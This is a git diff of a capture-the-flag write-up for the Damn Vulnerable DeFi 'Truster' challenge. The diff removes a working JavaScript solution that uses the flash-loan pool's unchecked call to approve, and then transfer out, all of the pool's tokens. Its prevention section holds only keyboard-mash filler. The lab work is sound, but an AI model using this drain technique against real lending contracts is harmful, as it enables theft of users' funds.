@@ -33,8 +33,9 @@ function flashLoan(uint256 amount, address borrower, address target, bytes calld
         return true;
     }
 ```
+<br/>
 
-**2.** The vulnarability cames from, **`TrusterLenderPool.sol`** contract's **`flashLoan(...)`** function.
+The vulnarability cames from, **`TrusterLenderPool.sol`** contract's **`flashLoan(...)`** function.
 
 **`TrusterLenderPool.sol`** contract **doesn't check** what are the 
 **`address target`** 
@@ -50,47 +51,19 @@ pass **function approve(address to, uint256 amount)** to **`bytes calldata data`
 
 And this will call **`approve`** function inside **`DVT token contract`**. And we will be able to transfer all tokens out of the pool 👌
 
-<br/>
+[**(Test File)**](Solution.md)
 
-Here how you can do it,
-
-```js
-// test/truster/truster.challenge.js
-
-it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
-
-        let abi = ["function approve(address to, uint256 amount)"];
-
-        let iface = new ethers.utils.Interface(abi);
-
-        const data = iface.encodeFunctionData("approve", [
-        player.address,
-        TOKENS_IN_POOL,
-        ]);
-
-        // we will aprove 'TOKENS_IN_POOL' tokens to 'player.address' after this call
-        await pool.flashLoan(0, player.address, token.address, data);
-        
-        // transfer tokens from pool.address to player.address
-        await token
-        .connect(player)
-        .transferFrom(pool.address, player.address, TOKENS_IN_POOL);
-
-    });
-```;
-```
 
 <br/>
 
 ## How could this exploit be prevented ?
-
+asdfsdafdasfdsadfdsaf
 
 
 <br/>
 
 
 ## How to test it
-got to ➡️ [**Damn Vulnerable Defi - Chalange #1**](https://www.damnvulnerabledefi.xyz/challenges/3.html). Clone the repository as mentioned and put [**solution code**](Solution.txt) to his place.
+got to ➡️ [**Damn Vulnerable Defi - Chalange #3**](https://www.damnvulnerabledefi.xyz/challenges/3.html). Clone the repository as mentioned and put [**solution code**](Solution.md) to his place.
 
 Then you can just type **`npm run truster`**
